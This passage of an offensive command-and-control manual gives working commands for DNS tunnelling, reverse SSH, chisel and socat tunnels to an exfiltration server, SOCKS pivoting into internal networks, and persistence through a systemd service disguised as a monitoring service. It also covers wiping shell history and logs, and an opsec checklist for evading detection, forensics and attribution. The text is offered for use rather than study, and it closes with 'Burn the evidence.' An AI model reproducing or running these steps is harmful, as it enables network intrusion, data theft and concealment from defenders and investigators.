iodined -f -P "<password>" -c 10.0.0.1 <YOUR_DOMAIN>

# Client (target):
iodine -f -P "<password>" <YOUR_DOMAIN>
# Creates tun0 interface on 10.0.0.2 — full IP tunnel over DNS
# Now: ssh -D 1080 user@10.0.0.1  (SOCKS proxy through DNS!)
```

#### 12.2.4 Verify: Check DNS C2 is Receiving

```bash
# On server — check incoming connections:
journalctl -u dns-c2 -f --no-pager
# Look for: "New session established"

# To pull data received via Method B (Python DNS exfil):
# The server's dnscat2 session log has all TXT queries.
# Reconstruct from dnscat2 session output or tcpdump:
tcpdump -i eth0 -A port 53 | grep -oP '[a-z0-9]+(?=\.x\d+\.<DOMAIN>)'
```

#### 12.2.5 Takedown

```bash
systemctl stop dns-c2
systemctl disable dns-c2
rm /etc/systemd/system/dns-c2.service
systemctl daemon-reload
unset HISTFILE && history -c && rm -f ~/.bash_history
# Let domain expire or transfer to burner. Terminate VPS.
```

---

### 12.3 Reverse Tunnel — 2 Minutes to Bidirectional Access

#### 12.3.1 Architecture

```
[TARGET: behind NAT/firewall]
       │
       │ OUTBOUND SSH -R (looks like admin remote access)
       ▼
[EXFIL SERVER: public IP]
       │
       │ SSH back into target through reverse tunnel
       ▼
[OPERATOR: now has shell on target through the tunnel]
```

#### 12.3.2 Prerequisites

| Item | Required | Notes |
|---|---|---|
| **Exfil Server** | Any VPS with SSH open | Port 22 or 443 (blends better) |
| **SSH Key** | Generated fresh | `ssh-keygen -t ed25519 -f /dev/shm/c2_key -N ""` |
| **On Target** | SSH client (`ssh` built-in) | No tools needed if `ssh` is present |

#### 12.3.3 Server: SSH Listener

```bash
# ──── On Exfil Server ────
# 1. Create dedicated user (looks like a monitoring service account)
useradd -m -s /bin/bash monitor-svc
mkdir -p /home/monitor-svc/.ssh

# 2. Add your public key
cat /dev/shm/c2_key.pub >> /home/monitor-svc/.ssh/authorized_keys
chmod 600 /home/monitor-svc/.ssh/authorized_keys
chown -R monitor-svc:monitor-svc /home/monitor-svc/.ssh

# 3. If you need the target to connect out (they can't reach port 22):
# Add to /etc/ssh/sshd_config:
echo "GatewayPorts yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

#### 12.3.4 Client: Reverse Shell — Three Methods

```bash
# ──── METHOD A: Pure SSH (built-in — works everywhere) ────
# On target — establish reverse tunnel:
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -R 0.0.0.0:2222:localhost:22 \
    -N -f \
    monitor-svc@<EXFIL_SERVER_IP>

# Now from operator:
ssh -p 2222 target_user@<EXFIL_SERVER_IP>
# You're SSH'd into the target through the tunnel!

# ──── Option: use port 443 for stealth (443 is rarely blocked) ────
ssh -R 0.0.0.0:443:localhost:22 -N -f monitor-svc@<EXFIL_SERVER_IP>
# Operator: ssh -p 443 target_user@<EXFIL_SERVER_IP>
```

```bash
# ──── METHOD B: chisel (single binary, no SSH needed on target) ────
# Server (exfil box):
curl -LO https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel

chisel server -p 443 --reverse --auth "op:$(pwgen -s 32 1)"

# Client (target — single curl + execute):
curl -sLO https://<EXFIL_SERVER_IP>:443/chisel  # Or host the binary
chmod +x chisel
./chisel client --auth "op:<password>" https://<EXFIL_SERVER_IP>:443 R:2222:localhost:22 &

# Operator: ssh -p 2222 target_user@localhost
```

```bash
# ──── METHOD C: socat (if installed — common on dev boxes) ────
# Server (exfil):
socat TCP-LISTEN:443,reuseaddr,fork TCP:localhost:2222 &

# Client (target):
socat TCP:<EXFIL_SERVER_IP>:443,forever,interval=10 TCP:localhost:22 &

# Operator connects to <EXFIL_SERVER_IP>:2222 → gets shell on target
```

#### 12.3.5 SOCKS Proxy over Reverse Tunnel

```bash
# Once reverse tunnel is up, create SOCKS proxy for full network access:
# On operator machine:
ssh -D 1080 -p 2222 target_user@<EXFIL_SERVER_IP>

# Now configure proxychains or browser to use socks5://127.0.0.1:1080
# Access target's internal network:
proxychains curl http://192.168.1.1      # Internal router
proxychains nmap -sT 10.0.0.0/24         # Internal scan
proxychains impacket-secretsdump ...      # Anything through the proxy
```

#### 12.3.6 Persist the Tunnel

```bash
# ──── On target: systemd service to auto-reconnect on reboot ────
cat > /etc/systemd/system/sshd-monitor.service << 'SVC'
[Unit]
Description=SSH Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=60 -R 0.0.0.0:2222:localhost:22 -N monitor-svc@<EXFIL_SERVER_IP>
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable sshd-monitor --now
# Tunnel now survives reboots and disconnects
```

#### 12.3.7 Verify Tunnel State

```bash
# On operator — check if tunnel is alive:
ssh -p 2222 -o ConnectTimeout=5 target_user@<EXFIL_SERVER_IP> 'echo ALIVE'

# On server — list active reverse tunnels:
ss -tlnp | grep 2222
# Should show: LISTEN 0.0.0.0:2222

# List connected SSH sessions:
who
ps aux | grep 'ssh.*-R'
```

#### 12.3.8 Takedown

```bash
# On target — kill tunnel and persistence:
systemctl stop sshd-monitor
systemctl disable sshd-monitor
rm /etc/systemd/system/sshd-monitor.service
pkill -f 'ssh.*-R.*2222'
unset HISTFILE && history -c && rm -f ~/.bash_history

# On server — remove user:
userdel -r monitor-svc
# Terminate VPS
```

---

### 12.4 Quick-Start Decision Matrix

| Scenario | Use | Reason |
|---|---|---|
| Need fast file exfil | **HTTPS C2** (12.1) | High bandwidth, legit traffic blend |
| Target has no tools, DNS only | **DNS C2** (12.2) | Works everywhere, very low detection |
| Need interactive shell on NAT target | **Reverse Tunnel** (12.3) | SSH built-in, chisel fallback |
| High-security environment | **DNS C2** (12.2) Method B | Python stdlib DNS — paper-thin footprint |
| Need full network proxy | **Reverse Tunnel** (12.3) + SOCKS | Pivot into internal network |
| Air-gapped or zero-tool target | **DNS C2** (12.2) Method B w/ bash | Pure bash `dig` loop |

---

## 13. OPERATIONAL SECURITY

### 13.1 Hardening Checklist

| Check | Action |
|---|---|
| ☐ No server-side logging | `access_log off; error_log /dev/null` |
| ☐ No bash history | `HISTFILE=/dev/null` |
| ☐ Valid TLS cert | Let's Encrypt, not self-signed |
| ☐ Legitimate User-Agent | Match browser/CDN |
| ☐ Rate-limited traffic | Don't spike; use jitter |
| ☐ Encrypted payloads | No plaintext in transit |
| ☐ Ephemeral infrastructure | Burn after each op |
| ☐ Multi-hop chain | Minimum 2 hops |

### 13.2 OpSec Mistakes That Burn Operators

| Mistake | Consequence |
|---|---|
| Reusing domains across ops | Correlation | Cross-op attribution |
| Self-signed certs | Instant red flag |
| Consistent User-Agent | Fingerprinting |
| No rate limiting | Anomaly detection triggers |
| Plaintext data in transit | DLP captures |
| Keeping servers alive after op | Forensic analysis window |
| Single-hop C2 | One subpoena away from operator |
| Same payment method | Financial correlation |

---

## 14. CONCLUSION

> **[CONCLUSION]:** The C2 is the heartbeat of every operation. Build it to be invisible. Rotate it to be untraceable. Burn it to be unfindable. The infrastructure that survives is the infrastructure that was never detected. Strip the signatures. Execute the transfer. Burn the evidence. 🚬

---

*END C2 ENVIRONMENT*
